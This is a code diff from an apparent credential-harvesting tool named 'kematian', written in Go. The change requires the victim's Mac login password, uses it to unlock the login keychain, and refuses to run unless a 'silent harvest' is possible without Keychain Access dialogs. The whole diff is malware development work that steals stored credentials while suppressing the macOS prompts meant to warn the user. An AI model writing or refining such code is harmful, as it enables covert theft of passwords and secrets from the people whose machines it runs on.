@@ -29,15 +29,18 @@ func main() {
 	if macPassword == "" {
 		macPassword = strings.TrimSpace(os.Getenv("KEMATIAN_MAC_PASSWORD"))
 	}
-	if macPassword != "" {
-		crypto.SetMacLoginPassword(macPassword)
-		if err := crypto.EnsureLoginKeychainUnlocked(); err != nil {
-			log.Printf("[kematian] keychain unlock failed: %v", err)
-		} else if !*quiet {
-			log.Printf("[kematian] login keychain unlocked — silent keychain access enabled")
-		}
-	} else if !*quiet {
-		log.Printf("[kematian] warning: no -mac-password — keychain prompts may appear during harvest")
+	if macPassword == "" {
+		log.Fatal("[kematian] -mac-password is required (or KEMATIAN_MAC_PASSWORD) — without it Keychain dialogs will appear")
+	}
+	crypto.SetMacLoginPassword(macPassword)
+	if err := crypto.EnsureLoginKeychainUnlocked(); err != nil {
+		log.Fatalf("[kematian] keychain unlock failed (wrong Mac login password?): %v", err)
+	}
+	if !crypto.LoginKeychainUnlocked() {
+		log.Fatal("[kematian] keychain not unlocked — cannot run silent harvest")
+	}
+	if !*quiet {
+		log.Printf("[kematian] keychain silent mode active (no Keychain Access dialogs)")
 	}
 
 	if runtime.GOOS != "darwin" {
